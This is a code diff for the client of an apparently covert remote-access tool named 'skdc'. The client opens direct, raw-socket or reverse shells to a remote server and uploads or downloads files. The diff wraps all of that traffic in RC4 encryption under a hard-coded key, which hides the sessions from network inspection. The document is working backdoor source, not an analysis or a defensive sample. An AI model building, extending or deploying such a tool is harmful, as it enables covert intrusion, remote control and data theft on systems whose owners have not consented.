@@ -1,3 +1,20 @@
+/*
+ * We could implement all the combinations, but these are the best.
+ *
+ * Direct shell (tcp socket in client, tcp socket in server):
+ * This mode bind a tcp port on the server and starts listening for new connections. This mode is for unprivileged 
+ * user only, and let us to use the client also as a unprivileged user.
+ * The workflow is:
+ *  ./client -a shell -h host -d port 
+ *
+ * Direct shell using full RAW connection (raw socket in client, raw socket in server):
+ *  ./client -a shell -h host -d port -l port
+ *
+ * Reverse shell (tcp socket in client, raw socket in server):
+ *  ./client -a shell -h host -d port -l port
+ *
+ */
+
 #include <string.h>
 #include <stdio.h>
 #include <unistd.h>
@@ -18,41 +35,18 @@
 #include "config.h"
 #include "common.h"
 #include "sha1.h"
+#include "rc4.h"
 
 struct rawsock r;
-//int swapd_pid, rawd_pid;
 int winchange = 1;
 unsigned char clientauth[20], serverauth[20];
-//rc4_ctx skd_crypt, skd_decrypt;
+rc4_ctx rc4_crypt, rc4_decrypt;
 
 // Per la redimesio de finestra
 void sig_winch(int i) {
     signal(SIGWINCH, sig_winch);
     winchange = 1;
 }
-
-/*void sig_child(int n) {
-    signal(SIGCHLD, sig_child);
-    waitpid(-1, NULL, WNOHANG);
-}*/
-
-/*
- * We could implement all the combinations, but these are the best.
- *
- * Direct shell (tcp socket in client, tcp socket in server):
- * This mode bind a tcp port on the server and starts listening for new connections. This mode is for unprivileged 
- * user only, and let us to use the client also as a unprivileged user.
- * The workflow is:
- *  ./client -a shell -h host -d port 
- *
- * Direct shell using full RAW connection (raw socket in client, raw socket in server):
- *  ./client -a shell -h host -d port -l port
- *
- * Reverse shell (tcp socket in client, raw socket in server):
- *  ./client -a shell -h host -d port -l port
- *
- */
-
 
 int usage(char *s) {
     printf("skdc - <whats[@t]wekk.net>\n"
@@ -78,14 +72,16 @@ int usage(char *s) {
 	return -1;
 }
 
-
 // Client actions
 int client_shell(int rsock, int wsock) {
     struct termios oldterm, newterm; 
-    char buf[BUFSIZE];
+    unsigned char buf[BUFSIZE];
     struct  winsize ws;
 	struct timeval tv;
 	int nfd = 0;
+
+    rc4_init((unsigned char *)KEY, sizeof(KEY), &rc4_crypt);
+    rc4_init((unsigned char *)KEY, sizeof(KEY), &rc4_decrypt);
 
     signal(SIGWINCH, sig_winch);
 
@@ -117,6 +113,7 @@ int client_shell(int rsock, int wsock) {
                 buffer[2] = ws.ws_col & 0xFF;
                 buffer[3] = (ws.ws_row >> 8) & 0xFF;
                 buffer[4] = ws.ws_row & 0xFF;
+                rc4(buffer, 5, &rc4_crypt);
                 write(wsock, buffer, 5);
             }
             winchange = 0;
@@ -133,6 +130,7 @@ int client_shell(int rsock, int wsock) {
 			unsigned char buffer[5];
 			memset(buffer, 0, 5);
             buffer[0] = ECHAR;
+            rc4(buffer, 5, &rc4_crypt);
             write(wsock, buffer, 5);
 		}
 		else {
@@ -140,14 +138,20 @@ int client_shell(int rsock, int wsock) {
         	if (FD_ISSET(0, &fds)) {
         	    int count = read(0, buf, BUFSIZE);
         	    if (count <= 0 && (errno != EINTR)) break;
+        	    if (memchr(buf, ECHAR, count)) {
+                    rc4(buf, count, &rc4_crypt);
+        	        write(wsock, buf, count);
+                    break;
+                }
+                rc4(buf, count, &rc4_crypt);
         	    if (write(wsock, buf, count) <= 0 && (errno != EINTR)) break;
-        	    if (memchr(buf, ECHAR, count)) break;
         	}
 
         	/* server => stdout */
         	if (FD_ISSET(rsock, &fds)) {
         	    int count = read(rsock, buf, BUFSIZE);
         	    if (count <= 0 && (errno != EINTR)) break;
+                rc4(buf, count, &rc4_decrypt);
         	    if (memchr(buf, ECHAR, count)) break; // to let server kill client
         	    if (write(1, buf, count) <= 0 && (errno != EINTR)) break;
         	}
@@ -164,8 +168,10 @@ int client_shell(int rsock, int wsock) {
 
 int client_upload(int sock, char *file) {
     int fd, bytes;
-    char buf[BUFSIZE];
+    unsigned char buf[BUFSIZE];
     unsigned long size, transfered;
+
+    rc4_init((unsigned char *)KEY, sizeof(KEY), &rc4_crypt);
 
     if ((fd = open(file, O_RDONLY)) < 0) {
         perror("open");
@@ -176,6 +182,7 @@ int client_upload(int sock, char *file) {
         transfered = 0;
         printf("Size: %lu bytes\n", size);
         while ((bytes = read(fd, buf, BUFSIZE)) > 0) {
+            rc4(buf, bytes, &rc4_crypt);
             if ((transfered += write(sock, buf, bytes)) < bytes) {
                 printf("ERROR AL LLEGIR!\n");
             } else  {
@@ -192,11 +199,13 @@ int client_upload(int sock, char *file) {
 
 int client_download(int sock, char *file) {
     int fd, bytes;
-    char buf[BUFSIZE];
+    unsigned char buf[BUFSIZE];
     char *ptr = strrchr(file, '/');
     struct timeval tv;
     int nfd = 0;
     fd_set  fds;
+
+    rc4_init((unsigned char *)KEY, sizeof(KEY), &rc4_decrypt);
 
     // Timeout
     tv.tv_sec=15;
@@ -215,9 +224,12 @@ int client_download(int sock, char *file) {
 
             nfd = select(sock + 1, &fds, NULL, NULL, &tv);
             if (nfd == 0) break;
-            else if (nfd > 0) {                           
-                bytes = read(sock, buf, BUFSIZE);
-                if (bytes > 0) {
+            else if (nfd > 0 && FD_ISSET(sock, &fds)) {                           
+                if ((bytes = read(sock, buf, BUFSIZE)) <= 0 && (errno != EINTR)) {
+                    break;
+                } else {
+                    errno = 0;
+                    rc4(buf, bytes, &rc4_decrypt);
                     if (write(fd, buf, bytes) < bytes) {
                     printf("ERROR AL LLEGIR!\n");
                     }
@@ -385,7 +397,6 @@ void tcp_action(int action, short local_port, char *host, short dest_port, char 
     struct sockaddr_in cli;
     unsigned long ip;
 
-    // TODO: retry several times 
     // Connect to skd
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
